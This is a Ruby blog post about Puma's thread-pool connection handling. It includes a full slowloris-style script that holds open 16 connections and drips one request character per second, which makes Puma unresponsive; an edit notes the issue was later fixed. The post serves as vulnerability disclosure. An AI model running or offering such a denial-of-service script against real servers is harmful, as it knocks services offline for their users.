---
title: Puma and the light
categories: [programming, ruby, lol]
layout: post
---

Today after I finished wrapping up [barlume](https://github.com/meh/barlume) I started
thinking about the next steps.

At first I thought about writing a reactor with it and adding a compatibility layer to
make it work like [EventMachine](https://github.com/eventmachine/eventmachine) (and it
will be done), but then I thought about Puma.

[Puma](http://puma.io/) is a very awesome Ruby web server, I really like what it tries to
achieve and by reading the homepage it seems really performant.

So I started digging around the source to see where I could improve its performances and
after seeing the orror of `IO.select` usage (which isn't that bad for how they use it) I
noticed how it handled connections and requests.

{% highlight ruby %}
@thread_pool = ThreadPool.new(@min_threads, @max_threads) do |client, env|
  process_client(client, env)
end
{% endhighlight %}

When it starts it creates a `ThreadPool`, the default minimum is **0** the default maximum is **16**,
after reading more of it, specifically that `process_client` function I realized something else:
it can only handle *maximum threads* clients at a time.

What are the consequences of this sad realization? The consequences are that this simple script
makes *puma* completely unresponsive:

{% highlight ruby %}
#! /usr/bin/env ruby
# encoding: utf-8
require 'socket'
require 'barlume'
require 'optparse'

options = {}

OptionParser.new do |o|
  options[:host]    = 'localhost'
  options[:port]    = 9292
  options[:threads] = 16
  options[:content] = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
  options[:sleep]    = 1

  o.on '-h', '--host host', 'the host of the server' do |value|
    options[:host] = value
  end

  o.on '-p', '--port port', Integer, 'the port of the server' do |value|
    options[:port] = value
  end

  o.on '-t', '--threads [MAX_THREADS]', Integer,
       'the max amount of threads on the server' do |value|
    options[:threads] = value
  end

  o.on '-c', '--content CONTENT', 'the string to send' do |value|
    options[:content] = value
  end

  o.on '-s', '--sleep SECONDS', Float,
       'the time to sleep before sending every character' do |value|
    options[:sleep] = value
  end
end.parse!

class Slowpoke < Barlume::Lucciola
  def initialize (socket, message)
    super(socket)

    @message = message
    @offset  = 0
  end

  def send_next
    return if done?

    write_nonblock @message[@offset]

    @offset += 1
  rescue Errno::EAGAIN, Errno::EWOULDBLOCK
  end

  def done?
    @offset >= @message.length
  end
end

lantern = Barlume::Lanterna.best

options[:threads].times {
  lantern << Slowpoke.new(TCPSocket.new(
    options[:host], options[:port]), options[:content])
}

puts "oh noes, a wall on my path D:"

until lantern.all?(&:done?)
  lantern.writable.each {|s|
    s.send_next
  }

  sleep options[:sleep]
end

puts "oh, there's a door ( ･ ◡◡･)"
{% endhighlight %}

I ran that script on a simple *sinatra* application and prepared to run `ab` to see
how it handled everything, this was the result:

{% highlight text %}
Benchmarking 127.0.0.1 (be patient)...apr_poll: The timeout specified has expired (70007)
{% endhighlight %}

It **dies**.

When the slowpokes are done everything restarts working properly.

So, what's next about all of this? I'll try to write a patch to make it use barlume
and keep it as concurrent as before.

In the meantime I'd suggest to not use it in production or at least with other external
measures to avoid that kind of attack.

EDIT: it has been fixed with [6777c77](https://github.com/puma/puma/commit/6777c771d829a31634b968c74a829cc53b80a144).
